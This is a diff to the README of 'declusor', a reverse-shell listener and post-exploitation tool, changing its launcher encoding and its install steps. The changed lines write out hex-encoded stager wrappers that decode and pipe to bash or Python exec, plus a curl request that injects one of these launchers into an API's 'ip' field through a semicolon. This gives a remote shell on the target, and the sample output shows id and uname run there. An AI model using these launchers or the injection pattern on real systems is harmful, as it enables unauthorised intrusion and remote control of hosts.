@@ -9,7 +9,6 @@
   <p>
     <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
     <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.11%2B-blue.svg" alt="Python 3.11+"></a>
-    <a href="https://pypi.org/project/declusor/"><img src="https://img.shields.io/pypi/v/declusor.svg" alt="PyPI version"></a>
     <a href="https://mypy.readthedocs.io/"><img src="https://img.shields.io/badge/typing-strict-brightgreen.svg" alt="Typing: Strict"></a>
     <a href="https://docs.astral.sh/ruff/"><img src="https://img.shields.io/badge/code%20style-ruff-orange.svg" alt="Code Style: Ruff"></a>
   </p>
@@ -111,9 +110,10 @@ declusor 0.0.0.0 4444 -p py_socket --launcher-output file:/tmp/stager.py
 ```
 
 > [!TIP]
-> Launchers are automatically Base64-encoded and packaged into native execution wrappers by default:
-> - **`shell_socket`**: `(echo '$DECLUSOR_SCRIPT'|base64 -d|bash)`
-> - **`py_socket`**: `python3 -c "import base64;exec(base64.b64decode('$DECLUSOR_SCRIPT'))"`
+> Launchers are automatically hex-encoded and packaged into native execution wrappers by default:
+>
+> - **`shell_socket`**: `bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\x$byte"; done | bash' _ '$DECLUSOR_SCRIPT'`
+> - **`py_socket`**: `python3 -c 'exec(bytes.fromhex("$DECLUSOR_SCRIPT"))'`
 
 ### 4. Interact with the Session
 
@@ -133,7 +133,7 @@ exit    : Terminate the session and exit the program.
 #### Example: Running Commands
 
 ```text
-[declusor] command id && uname -a
+[declusor] command 'id && uname -a'
 uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
 Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
 ```
@@ -173,20 +173,20 @@ Content-Type: application/json
 declusor 127.0.0.1 4444 --plugin shell_socket
 ```
 
-**2. Declusor will immediately print the tailored, Base64-encoded launcher one-liner ready for execution:**
+**2. Declusor will immediately print the tailored, hex-encoded launcher one-liner ready for execution:**
 
 ```bash
 # Inject the displayed one-liner directly via curl
 curl -s -X POST https://target.example/api/diagnostics/ping \
      -H "Content-Type: application/json" \
-     -d "{\"ip\": \"127.0.0.1; (echo '<DECLUSOR_BASE64_STAGER>'|base64 -d|bash)\"}"
+  -d "{\"ip\": \"127.0.0.1; <DECLUSOR_SHELL_SOCKET_HEX_LAUNCHER>\"}"
 ```
 
 **3. Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion.**
 
 ```console
 $ declusor 127.0.0.1 4444
-(echo 'ZXhlYyAzPD4...'|base64 -d|bash)
+bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\x$byte"; done | bash' _ '<DECLUSOR_HEX_STAGER>'
 
 [declusor]
 ```
@@ -224,55 +224,35 @@ Declusor requires **Python 3.11+** and runs natively on Linux, macOS, and Window
 
 ### Installation
 
-#### Option A: Isolated CLI Install (Recommended for Operators)
+Declusor and its built-in plugins are installed from the GitHub repository; they are not published on PyPI.
 
-Install directly into an isolated environment using [uv](https://github.com/astral-sh/uv), [pipx](https://pypa.github.io/pipx/), or standard `pip`:
+#### Option A: Install from GitHub with `uv` (Recommended)
 
-```bash
-# Using uv (fastest)
-uv tool install declusor
-# or run ephemerally without installing
-uvx declusor 0.0.0.0 4444
-
-# Using pipx
-pipx install declusor
-
-# Using pip
-pip install declusor
-```
-
-#### Option B: Fast Development Setup with `uv` (Recommended for Contributors)
-
-Clone the repository and let `make install` configure your virtual environment, sync all dependencies, and link all native plugins in editable mode:
+Clone the repository, create its virtual environment, and install the CLI and built-in plugins:
 
 ```bash
 git clone https://github.com/othonhugo/declusor.git
 cd declusor
-
-# Option B1: Using Make (recommended, runs uv sync + installs editable plugins)
-make install
-
-# Option B2: Using uv directly
-uv sync
+uv sync --no-default-groups
 make install-plugins
-# (or: uv pip install -e plugins/shell_socket -e plugins/py_socket)
+.venv/bin/declusor 0.0.0.0 4444
 ```
 
-#### Option C: Standard Virtualenv Setup with `pip`
+#### Option B: Install from GitHub with `pip`
 
 ```bash
 git clone https://github.com/othonhugo/declusor.git
 cd declusor
 
-# Create and activate virtual environment
+# Create and activate an isolated environment
 python3 -m venv .venv && source .venv/bin/activate
 
-# Install host package and development tools
-pip install -e ".[dev,testing]"
-
-# Install native plugins in editable mode
+# Install the CLI from the checkout and link its built-in plugins
+python -m pip install -e .
 make install-plugins
-# (or: pip install -e plugins/shell_socket -e plugins/py_socket)
+
+# Start the CLI
+declusor 0.0.0.0 4444
 ```
 
 ## Extensible Plugin Ecosystem
